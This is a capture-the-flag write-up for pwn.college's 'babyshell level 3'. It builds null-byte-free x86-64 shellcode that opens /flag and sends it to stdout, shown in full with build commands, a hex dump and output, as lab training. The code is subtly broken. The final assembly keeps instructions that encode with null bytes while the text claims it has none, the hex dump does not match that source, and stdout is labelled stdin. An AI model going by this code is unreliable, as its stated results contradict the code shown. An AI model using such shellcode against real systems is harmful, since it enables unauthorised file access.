# Babyshell Level 3
Babyshell level 3 is the third challenge from pwn.college shellcoding module, it is pretty simple if you have watched the [videos for the module](https://www.youtube.com/watch?v=715v_-YnpT8&t=1968s).

## Solving The Challenge
Solving the challenge is pretty straight forward, we need to remove all null bytes from our shellcode, if there is any null bytes in our shellcode the program will fail.

The challenge took me a couple hours to solve since i had to find instructions that doesn't contains any null bytes in their opcode, i found the following informations :
	- a lot of time **mov** instructions have null bytes in their opcode, however with **rbx** that was not the case, so i used **rbx** a little in the final solution **instead of directly moving the value "/flag" into rdi**.
	- if your string ends with a **null character**, you can **replace it for a carriage return.**
	- **push and pop** can be easily used as a replacement for the **mov** instruction, just push the value on the stack and pop it back into any register you want, we will use this technique **a LOT**, this way we will spend less time trying to fix mov instructions with null bytes.

With the preceding informations we should have a really got view of how we will solve this challenge.

Let's start writing our shellcode, first we need a opened file descriptor to our flag file :
```x86asm
.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value "galf" in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a "/" in bl register
	mov bl, 0x2f			# mov 0x2f "/" inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value "/flag" which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel
```

When this code executes it should return a file descriptor to the "/flag" file. 

We moved the value "/flag" using ebx and a shift left because "/flag" is 5 bits long and moving a 5 bytes value inside rbx (8 bytes register), it would have certainly implied some null bytes in the opcode.

The value "**flag**", is 4 bytes wide which **fits inside ebx**, so we can just **move "flag" in ebx**, **shift it to the left 8 bits** so we have space to put "/" in the **lower 8 bits of ebx**, and mov **0x2f** in it which is "/" in ascii encoding.

The next step was to actually put rbx inside rdi since rbx is not on the x64 kernel calling convention, so just push the value inside rbx onto the stack and pop it back inside rdi, and you should have done the hardest part in this shellcode.

The next steps are exactly as in the last challenge (babyshell 2), but in this one we'll use **push and pop** instructions instead of using the **mov** instruction for the arguments.

Just like in the last challenge we will use the **sendfile systemcall** to read the file and send it to a file descriptor, in our case (**stdout**).

The function definition for sendfile is the following :
```c
ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
```
The function takes three arguments, the output file descriptor, the input file descriptor, the offset (in our case 0), and the count of bytes we wish to read.

On x86_64 linux the kernel interface uses the following register as calling convention  : **%rdi, %rsi, %rdx, %r10, %r8 and %r9.** Since **sendfile** had 4 arguments, we will need **%rdi, %rsi, %rdx, %r10**.

Let's write the second part of our shellcode :
```x86asm
.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value "galf" in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a "/" in bl register
	mov bl, 0x2f			# mov 0x2f "/" inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value "/flag" which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel
```

With the preceding code, if you compile it, it should work and read the file, however we want a clean exit, to avoid any bug with our program when leaving or returning, for this reason we will write a last system call which will cause to exit the program cleanly :
```x86asm
.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value "galf" in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a "/" in bl register
	mov bl, 0x2f			# mov 0x2f "/" inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value "/flag" which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel

	# Exit the program cleanly
	push 60 				# system call number
	pop rax					# pop system call number in rax
	push 69					# exit number
	pop rdi					# pop exit number in rdi
	syscall
```

And we should have a shellcode that contains no null bytes, just like the program asks us, let's make sure we did everything right :
```
$ gcc -w -nostdlib -static -o shell shellcode.s -masm=intel
$ ./shell
flag{fake_flag_for_testing}
$ objcopy --dump-section .text=solver shell
$ xxd solver
```

After running xxd on the resulting file you should see all the bytes in hexadecimal the shellcode actually has, if it contains any "00" we have failed the shellcode, if it don't we successfully achieved what we wanted to :
```
$ xxd solver
00000000: 4831 f6bb 666c 6167 48c1 e308 b32f 5348  H1..flagH..../SH
00000010: 89e7 6a02 580f 056a 015f 505e 4831 d26a  ..j.X..j._P^H1.j
00000020: 6441 5a6a 2858 0f05 6a3c 586a 2a5f 0f05  dAZj(X..j<Xj*_..
```

And it looks to me like we were able to evade this no null-bytes filter on the shellcode !

Let's prove it :
```
$ ./babyshell_level3 <solver
flag{fake_flag_for_testing}
```

:)
